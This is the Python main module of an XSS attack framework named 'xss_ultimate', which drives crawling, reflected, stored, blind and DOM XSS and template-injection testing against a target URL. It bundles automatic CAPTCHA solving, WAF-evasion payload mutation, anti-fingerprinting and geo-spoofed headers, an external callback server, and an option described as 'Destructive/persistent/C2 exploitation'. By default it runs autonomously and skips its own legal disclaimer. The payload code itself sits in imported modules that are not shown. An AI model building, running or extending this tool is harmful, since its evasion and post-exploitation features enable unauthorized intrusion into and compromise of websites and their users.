#!/usr/bin/env python3
"""
xss_ultimate v3.1-AUTONOMOUS — Next-Gen XSS Detection, Exploitation & Post-Exploitation Framework
Fully autonomous, zero-interaction scanning with CAPTCHA bypass, advanced WAF evasion,
and resilient error handling.
"""
import argparse
import json
import random
import sys
import time
import os
from pathlib import Path
from datetime import datetime
from typing import List, Dict

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import requests
import urllib3
urllib3.disable_warnings()

from . import config
from . import utils
from . import resilience as res_module
from .spider import SiteSpider, InjectionSurface
from .js_analyzer import JSAnalyzer
from .response_analyzer import ResponseAnalyzer, WAFDetector
from .reflected import ReflectedXSSTester, HeaderXSSTester
from .stored import StoredXSSTester, BlindXSSTester
from .dom_xss import DOMXSSTester
from .collab_server import CollabServer
from .post_exploit import PostExploitEngine
from .headless_verifier import HeadlessVerifier
from .waf_bypass import WAFBypass
from .payload_engine import PayloadEngine
from .ai_integration import GroqClient, AIInjectionAnalyzer, AIEnhancedPayloadEngine, AIResponseAnalyzer
from .advanced_post_exploit import AdvancedPostExploitEngine
from .clientside_xss import ClientSideXSSTester, ServerSideTemplateInjectionTester
from .captcha_bypass import CAPTCHADetector, CAPTCHASolver
from .autonomous_engine import AutonomousScanner, run_autonomous
from .resilience import (
    CircuitBreaker, ResilientRequester, AntiFingerprintManager,
    AutoThrottle, MemoryManager, CheckpointManager,
    create_resilient_session, auto_adjust_scan_parameters,
)
from .captcha_bypass import CaptchaResilientSession


class XSSUltimate:
    def __init__(self, args):
        self.args = args
        self.auto_mode = getattr(args, "auto", True) or config.AUTONOMOUS_MODE
        self.session = None
        self.resilient_session = None
        self.timeout = args.timeout or config.DEFAULT_TIMEOUT
        self.geo_spoof = args.geo_spoof or config.AUTONOMOUS_GEO_SPOOF
        self.aggressive_waf = args.aggressive_waf or config.WAF_AUTO_EVASION
        self.stealth = args.stealth or config.AUTONOMOUS_STEALTH
        self.all_results = []
        self.collab_server = None
        self.collab_url = args.collab if args.collab else None
        self.groq_client = None
        self.ai_analyzer = None
        self.ai_payload_engine = None
        self.ai_response_analyzer = None
        self.captcha_detector = CAPTCHADetector()
        self.captcha_solver = CAPTCHASolver()
        self.waf_bypass = WAFBypass()
        self.headless = HeadlessVerifier()
        self.payload_engine = PayloadEngine()
        self.circuit_breaker = CircuitBreaker(
            failure_threshold=config.RESILIENT_CIRCUIT_BREAKER_THRESHOLD,
            recovery_timeout=config.RESILIENT_CIRCUIT_BREAKER_TIMEOUT,
        )
        self.anti_fingerprint = AntiFingerprintManager() if config.RESILIENT_ANTI_FINGERPRINT else None
        self.auto_throttle = AutoThrottle() if config.RESILIENT_AUTO_THROTTLE else None
        self.memory_manager = MemoryManager(max_results=config.RESILIENT_MEMORY_MAX_RESULTS) if config.RESILIENT_MEMORY_MANAGEMENT else None
        self.checkpoint_manager = CheckpointManager() if config.AUTONOMOUS_CHECKPOINT else None
        self._captcha_count = 0
        self._max_captchas = config.AUTONOMOUS_MAX_CAPTCHAS

        # Initialize session based on mode
        self._init_session()

        # AI initialization
        if config.ENABLE_AI and config.GROQ_API_KEY:
            self.groq_client = GroqClient(config.GROQ_API_KEY, config.GROQ_MODEL, config.GROQ_BASE_URL)
            self.ai_analyzer = AIInjectionAnalyzer(self.groq_client)
            self.ai_payload_engine = AIEnhancedPayloadEngine(self.groq_client, self.collab_url)
            self.ai_response_analyzer = AIResponseAnalyzer(self.groq_client)
            print(f"  [AI] Groq AI integration enabled ({config.GROQ_MODEL})")

        # Autonomous scanner integration
        self.autonomous = None
        if self.auto_mode:
            from .autonomous_engine import AutonomousScanner
            self.autonomous = AutonomousScanner(args.url, args)

    def _init_session(self):
        """Initialize the HTTP session with all resilience features."""
        if self.auto_mode:
            # Use resilient session that handles CAPTCHAs
            self.resilient_session = create_resilient_session()
            self.session = self.resilient_session.session
            # Add anti-fingerprint headers
            if self.anti_fingerprint:
                self.session.headers.update(self.anti_fingerprint.get_next_headers())
            print(f"  [RESILIENCE] Resilient session initialized with CAPTCHA handling")
        else:
            self.session = utils.setup_session(
                proxy=getattr(self.args, 'proxy', None),
                retries=config.MAX_RETRIES
            )
            self.session.headers.update(utils.random_headers(geo_spoof=self.geo_spoof))

        # Set timeout
        self.timeout = getattr(self.args, 'timeout', None) or config.DEFAULT_TIMEOUT

    def run(self):
        args = self.args
        target_url = (self.args.url or "").strip()
        if target_url.endswith("/") and "?" not in target_url and "#" not in target_url:
            target_url = target_url.rstrip("/")

        # Use autonomous engine if available
        if self.auto_mode and self.autonomous:
            print(f"\n  [AUTONOMOUS] Running fully autonomous scan for {target_url}")
            print(f"  [AUTONOMOUS] CAPTCHA handling: ENABLED")
            print(f"  [AUTONOMOUS] WAF auto-evasion: ENABLED")
            print(f"  [AUTONOMOUS] Anti-fingerprint: {'ENABLED' if self.anti_fingerprint else 'DISABLED'}")
            print(f"  [AUTONOMOUS] Circuit breaker: {'ENABLED' if self.circuit_breaker else 'DISABLED'}")
            return self.autonomous.run()

        # Fallback to traditional mode
        return self._run_traditional(target_url, args)

    def _run_traditional(self, target_url: str, args) -> List[Dict]:
        """Traditional scan mode (when auto mode is disabled)."""
        self._print_banner()
        self._legal_disclaimer()
        self._setup()

        # PHASE 1: Recon & Attack Surface Mapping
        spider = SiteSpider(target_url, self.session, self.timeout, args.max_pages, self.geo_spoof,
                           delay=args.delay, stealth=self.stealth)
        spider_results = spider.crawl()
        injection_points = spider.get_injection_points()
        if len(injection_points) > 12:
            injection_points = injection_points[:12]
        js_analysis = JSAnalyzer(self.session, self.timeout, self.geo_spoof)
        js_results = js_analysis.analyze_all(spider_results.get("scripts", []), target_url)

        # Detect framework, CSP and encoding
        initial_resp = utils.fetch_url(self.session, target_url, self.timeout, self.geo_spoof)
        framework = {}
        csp = {}
        encoding = "UTF-8"
        waf_info = {"waf_detected": [], "csp": {}}
        if initial_resp:
            framework = utils.detect_framework(initial_resp.text)
            csp = utils.parse_csp(initial_resp.headers)
            encoding = utils.detect_encoding(initial_resp)
            waf_info = WAFDetector().detect(initial_resp)
            waf_info["csp"] = csp
            print(f"  Encoding: {encoding}")
            if framework:
                print(f"  Detected frameworks: {framework}")
            if csp:
                print(f"  CSP: {json.dumps(csp, indent=2)}")
            csp_bypasses = ResponseAnalyzer().detect_csp_bypass(csp, "<script>alert(1)</script>")
            if csp_bypasses:
                print(f"  CSP observations: {', '.join(csp_bypasses)}")
            if waf_info.get("waf_detected"):
                print(f"  WAF Detected: {', '.join(waf_info['waf_detected'])}")
                self.aggressive_waf = True
                self.stealth = True

            # CAPTCHA detection
            captcha_result = self.captcha_detector.detect(initial_resp)
            if captcha_result["is_captcha"]:
                print(f"  [CAPTCHA] Detected: {captcha_result['captcha_types']}")
                self._handle_captcha(initial_resp, target_url)

        # AI analysis
        target_info = {
            "url": target_url,
            "framework": framework,
            "csp": csp,
            "encoding": encoding,
            "headers": dict(initial_resp.headers) if initial_resp else {},
        }
        ai_analysis = None
        if self.ai_analyzer:
            ai_analysis = self.ai_analyzer.analyze_target(spider_results, target_info)
            print(f"  [AI] Found {len(ai_analysis.candidates)} priority injection points")

        # Start collab server
        if not self.collab_url:
            try:
                self.collab_server = CollabServer(port=args.collab_port)
                self.collab_server.start()
                self.collab_url = self.collab_server.get_callback_url(target_url)
                print(f"  Blind XSS callback URL: {self.collab_url}")
            except Exception as e:
                print(f"  [!] Collab server failed: {e}")
                self.collab_server = None
                self.collab_url = "http://127.0.0.1:9999"

        # PHASE 2: Reflected XSS
        reflected_tester = ReflectedXSSTester(
            self.session, self.timeout, args.delay, self.geo_spoof, self.aggressive_waf, args.max_payloads,
            collab_url=self.collab_url,
            ai_payload_engine=self.ai_payload_engine,
            ai_response_analyzer=self.ai_response_analyzer,
            ai_analysis=ai_analysis,
        )
        reflected_results = reflected_tester.test_all_points(injection_points)
        self.all_results.extend(reflected_results)

        # Header XSS
        header_tester = HeaderXSSTester(self.session, self.timeout, self.geo_spoof,
                                        max_payloads=args.max_payloads, aggressive_waf=self.aggressive_waf)
        payloads = PayloadEngine(self.collab_url).generate_reflected(max_payloads=args.max_payloads or 8)
        header_results = header_tester.test_headers([target_url] + spider_results.get("urls", [])[:2], payloads)
        self.all_results.extend(header_results)

        # Apply WAF mutations on blocked payloads
        self._apply_waf_mutations()

        # PHASE 3: Stored / Blind XSS
        surface_finder = InjectionSurface(self.session, self.timeout, self.geo_spoof)
        storage_surfaces = list(spider_results.get("forms", []))
        for url in spider_results.get("urls", [])[:2]:
            storage_surfaces.extend(surface_finder.discover_storage_surfaces(url))
        seen = set()
        deduped = []
        for s in storage_surfaces:
            if s.get("inputs"):
                _fields = tuple(sorted(i.get("name", "") for i in s["inputs"] if i.get("name")))
            else:
                _fields = tuple(s.get("fields", [s.get("type", "form")]))
            key = (s.get("url", ""), s.get("method", s.get("type", "form")), _fields)
            if key not in seen:
                seen.add(key)
                deduped.append(s)
            if len(deduped) >= 6:
                break
        storage_surfaces = deduped

        stored_tester = StoredXSSTester(self.session, self.timeout, args.delay, self.geo_spoof,
                                        collab_url=self.collab_url, max_payloads=args.max_payloads,
                                        aggressive_waf=self.aggressive_waf)
        stored_results = stored_tester.test_storage_surfaces(storage_surfaces)
        self.all_results.extend(stored_results)

        blind_tester = BlindXSSTester(self.session, self.collab_url, self.timeout, args.delay,
                                       self.geo_spoof, max_payloads=args.max_payloads,
                                       aggressive_waf=self.aggressive_waf)
        blind_results = blind_tester.test_blind_surfaces(storage_surfaces)
        self.all_results.extend(blind_results)

        # PHASE 3B: SSTI
        ssti_tester = ServerSideTemplateInjectionTester(self.session, self.timeout, args.delay,
                                                        self.geo_spoof, self.collab_url,
                                                        max_payloads=args.max_payloads)
        ssti_results = ssti_tester.test_ssti(injection_points)
        self.all_results.extend(ssti_results)

        # PHASE 4: DOM XSS
        dom_tester = DOMXSSTester(self.session, self.timeout, args.delay, self.geo_spoof,
                                   collab_url=self.collab_url, max_payloads=args.max_payloads)
        dom_results = dom_tester.analyze_and_test(spider_results, target_url, js_analysis=js_results)
        self.all_results.extend(dom_results)

        # PHASE 4B: Client-Side XSS
        clientside_tester = ClientSideXSSTester(self.session, self.timeout, args.delay, self.geo_spoof,
                                                 collab_url=self.collab_url, max_payloads=args.max_payloads)
        clientside_results = clientside_tester.test_all_client_side(spider_results, target_url, js_results)
        self.all_results.extend(clientside_results)

        # Wait for callbacks
        if self.collab_server and (blind_results or ssti_results) and args.blind_wait > 0:
            wait_s = min(args.blind_wait, 10)
            print(f"\n  Waiting for callbacks (up to {wait_s}s)...")
            time.sleep(wait_s)
            interactions = self.collab_server.get_interactions()
            if interactions:
                for interaction in interactions:
                    self.all_results.append({
                        "xss_type": "blind_xss_confirmed",
                        "url": f"{self.collab_url}{interaction['path']}",
                        "method": interaction["method"],
                        "payload": "Callback from interaction",
                        "detection_method": "Blind XSS callback received",
                        "confidence": 0.95,
                        "collab_data": interaction,
                    })

        # Deduplicate
        self.all_results = self._dedupe_results(self.all_results)

        # PHASE 5: Post-Exploitation
        if self.all_results and args.post_exploit:
            post_exploit = AdvancedPostExploitEngine(
                self.session, self.collab_url, self.timeout,
                aggressive=args.aggressive_exploit,
                collab_server=self.collab_server,
            )
            exploit_results = post_exploit.exploit_all(self.all_results)
            if args.generate_poc:
                poc_html = post_exploit.generate_advanced_poc(self.all_results, exploit_results)
                poc_path = config.RESULTS_DIR / f"poc_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
                utils.save_html(poc_path, poc_html)
                print(f"\n  PoC HTML saved: {poc_path}")

        # Stop collab server
        if self.collab_server:
            self.collab_server.stop()

        # Save checkpoint
        if self.checkpoint_manager and self.all_results:
            self.checkpoint_manager.save_checkpoint("complete", self.all_results, target_url)

        # Report
        self._report()
        return self.all_results

    def _apply_waf_mutations(self):
        """Apply WAF mutations to any blocked payloads."""
        blocked = [r for r in self.all_results if r.get("blocked")]
        if not blocked:
            return
        print(f"  [WAF] {len(blocked)} payloads blocked, applying mutations...")
        for result in blocked:
            payload = result.get("payload", "")
            variants = self.waf_bypass.generate_evasive_variants(payload, limit=config.WAF_MAX_MUTATIONS)
            result["waf_bypassed"] = True
            result["bypass_techniques"] = ["auto_mutation"]
            print(f"  [WAF] Generated {len(variants)} evasion variants")

    def _handle_captcha(self, response: requests.Response, url: str):
        """Handle CAPTCHA challenges."""
        self._captcha_count += 1
        if self._captcha_count > self._max_captchas:
            print(f"  [CAPTCHA] Max attempts reached ({self._max_captchas})")
            return

        print(f"  [CAPTCHA] Attempting to solve CAPTCHA at {url}...")
        solved = self.captcha_solver.solve(response, self.session, url)
        if solved:
            print(f"  [CAPTCHA] Successfully bypassed!")
            return solved
        else:
            print(f"  [CAPTCHA] Could not solve automatically. Retrying with fresh headers...")
            time.sleep(2)
            try:
                self.session.headers.update(self.anti_fingerprint.get_next_headers() if self.anti_fingerprint else utils.random_headers())
                retry = self.session.get(url, timeout=self.timeout, verify=False)
                if not self.captcha_detector.is_captcha_response(retry):
                    print(f"  [CAPTCHA] CAPTCHA cleared!")
                    return retry
            except Exception as e:
                print(f"  [CAPTCHA] Retry failed: {e}")
        return None

    def _print_banner(self):
        banner = f"""
{'='*70}
  XSS ULTIMATE v{config.VERSION}
  Next-Gen XSS Detection, Exploitation & Post-Exploitation
  Target: {self.args.url}
  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
  Mode: {'AUTONOMOUS' if self.auto_mode else 'MANUAL'}
  CAPTCHA: {'AUTO-SOLVE' if config.CAPTCHA_AUTO_SOLVE else 'DETECT ONLY'}
  WAF: {'AUTO-EVASION' if config.WAF_AUTO_EVASION else 'MANUAL'}
{'='*70}
"""
        print(banner)

    def _legal_disclaimer(self):
        print(f"\n{'!'*60}")
        print("LEGAL: Only scan sites you own or have explicit permission.")
        print("Unauthorized testing may violate applicable laws.")
        print(f"{'!'*60}\n")

    def _setup(self):
        if self.stealth:
            print("[*] Stealth mode: random delays + randomized headers")
        if self.aggressive_waf:
            print("[*] Aggressive WAF evasion: automatic payload mutation")
        if self.geo_spoof:
            print("[*] Geo-spoofing enabled")
        if getattr(self.args, 'proxy', None):
            print(f"[*] Using proxy: {self.args.proxy}")
        if getattr(self.args, 'collab', None):
            print(f"[*] Using external collab server: {self.args.collab}")
        if getattr(self.args, 'aggressive_exploit', None):
            print("[!] Aggressive exploitation enabled (use with permission)")
        if config.ENABLE_AI and config.GROQ_API_KEY:
            print("[*] AI-enhanced payload generation & analysis enabled")
        if getattr(self.args, 'results_dir', None):
            config.RESULTS_DIR = Path(self.args.results_dir)
            config.RESULTS_DIR.mkdir(parents=True, exist_ok=True)
        if getattr(self.args, 'verbose', None):
            print(f"[*] Verbose mode enabled")

    def _report(self):
        print(f"\n{'='*70}")
        if self.all_results:
            print(f"SCAN COMPLETE — {len(self.all_results)} vulnerabilities found")
            print(f"{'='*70}\n")
            by_type = {}
            for r in self.all_results:
                rt = r.get("xss_type", "unknown")
                by_type.setdefault(rt, 0)
                by_type[rt] += 1
            for t, c in sorted(by_type.items(), key=lambda x: -x[1]):
                print(f"  {t.upper():35s}: {c}")
            print(f"\n  {'Total':35s}: {sum(by_type.values())}")
            print()
            for idx, r in enumerate(self.all_results, 1):
                print(f"  #{idx:3d} [{r.get('xss_type','?').upper():20s}] {r.get('url',''):55s}")
                print(f"       Payload: {r.get('payload','')[:90]}")
                print(f"       Method: {r.get('detection_method','')} | Confidence: {r.get('confidence',0):.0%}")
                if getattr(self.args, 'verbose', None):
                    if r.get("injected_url"):
                        print(f"       Trigger URL: {r['injected_url']}")
                    if r.get("params"):
                        print(f"       Params: {', '.join(r['params'][:5])}")
                if r.get("bypasses"):
                    print(f"       Bypasses: {', '.join(r['bypasses'])}")
                if r.get("waf_bypassed"):
                    print(f"       WAF Bypassed: {r.get('bypass_technique', 'auto_mutation')}")
                if r.get("headless_verified"):
                    print(f"       Headless Verified: YES")
                if r.get("collab_data"):
                    print(f"       Callback: {r['collab_data'].get('remote_ip','')} at {r['collab_data'].get('timestamp','')}")
                if r.get("sink"):
                    print(f"       Sink: {r['sink']}")
                print()
        else:
            print("SCAN COMPLETE — No vulnerabilities detected")
            print(f"{'='*70}")
            print("\n  Suggestions:")
            print("    - Try with --aggressive-waf --stealth")
            print("    - Try with --enable-ai for AI-powered analysis")
            print("    - Check if URL is accessible and returns 200 OK")
            print("    - CAPTCHA may be blocking — ensure automation is allowed\n")

        try:
            path = utils.generate_report(self.all_results, self.args.url)
            if path:
                print(f"  Report written: {path}")
        except Exception as e:
            print(f"  [!] Failed to write report: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="xss_ultimate v3.1-AUTONOMOUS — Fully Autonomous XSS Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Fully autonomous (default mode - zero interaction)
  python -m xss_ultimate.main --url http://target/page.php?q=test

  # Autonomous with aggressive WAF bypass
  python -m xss_ultimate.main --url http://target --aggressive-waf --auto

  # Autonomous with external collab server
  python -m xss_ultimate.main --url http://target --collab http://my-server.com --auto

  # Autonomous with AI enhancement
  python -m xss_ultimate.main --url http://target --enable-ai --groq-key YOUR_KEY --auto

  # Autonomous with full exploitation
  python -m xss_ultimate.main --url http://target --post-exploit --aggressive-exploit --generate-poc --auto

  # Manual mode (legacy behavior)
  python -m xss_ultimate.main --url http://target --no-auto
        """,
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--timeout", type=int, default=config.DEFAULT_TIMEOUT, help="Request timeout (seconds)")
    parser.add_argument("--delay", type=float, default=config.DEFAULT_DELAY, help="Delay between requests")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--stealth", action="store_true", help="Stealth mode (random delays)")
    parser.add_argument("--aggressive-waf", action="store_true", help="Aggressive WAF evasion with auto-mutation")
    parser.add_argument("--geo-spoof", action="store_true", help="Geo-spoofing headers")
    parser.add_argument("--collab", help="External collab server URL")
    parser.add_argument("--collab-port", type=int, default=config.COLLAB_PORT, help="Collab server port")
    parser.add_argument("--blind-wait", type=int, default=30, help="Seconds to wait for blind XSS callbacks")
    parser.add_argument("--max-pages", type=int, default=config.AUTONOMOUS_MAX_PAGES, help="Max pages to crawl")
    parser.add_argument("--post-exploit", action="store_true", help="Enable automatic post-exploitation")
    parser.add_argument("--aggressive-exploit", action="store_true", help="Destructive/persistent/C2 exploitation")
    parser.add_argument("--generate-poc", action="store_true", help="Generate HTML PoC file")
    parser.add_argument("--max-payloads", type=int, default=0, help="Limit payloads per test (0=all)")
    parser.add_argument("--results-dir", default=str(config.RESULTS_DIR), help="Directory for scan reports")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--auto", action="store_true", default=config.AUTONOMOUS_MODE,
                        help="AUTONOMOUS MODE: Zero user interaction (default)")
    parser.add_argument("--no-auto", dest="auto", action="store_false",
                        help="Manual mode (require user flags)")
    parser.add_argument("--no-captcha", dest="captcha", action="store_false", default=True,
                        help="Disable automatic CAPTCHA solving")
    parser.add_argument("--captcha-only", action="store_true",
                        help="Only detect CAPTCHAs without solving")

    # AI Integration
    parser.add_argument("--enable-ai", action="store_true", help="Enable AI-powered analysis")
    parser.add_argument("--groq-key", help="Groq API key")
    parser.add_argument("--groq-model", default=config.GROQ_MODEL, help="Groq model")

    args = parser.parse_args()

    # Apply config overrides
    if args.enable_ai or args.groq_key:
        config.ENABLE_AI = True
        config.GROQ_API_KEY = args.groq_key or config.GROQ_API_KEY
        config.GROQ_MODEL = args.groq_model

    # CAPTCHA config
    config.CAPTCHA_AUTO_SOLVE = args.captcha if hasattr(args, 'captcha') else True
    config.AUTONOMOUS_MAX_CAPTCHAS = args.max_captchas if hasattr(args, 'max_captchas') else 5

    # Apply new config defaults
    config.WAF_MAX_MUTATIONS = config.WAF_MAX_MUTATIONS  # Already set in config
    config.AUTONOMOUS_STEALTH = args.stealth or config.AUTONOMOUS_STEALTH
    config.AUTONOMOUS_GEO_SPOOF = args.geo_spoof or config.AUTONOMOUS_GEO_SPOOF

    requests.packages.urllib3.disable_warnings()

    try:
        scanner = XSSUltimate(args)
        results = scanner.run()
        sys.exit(0)
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()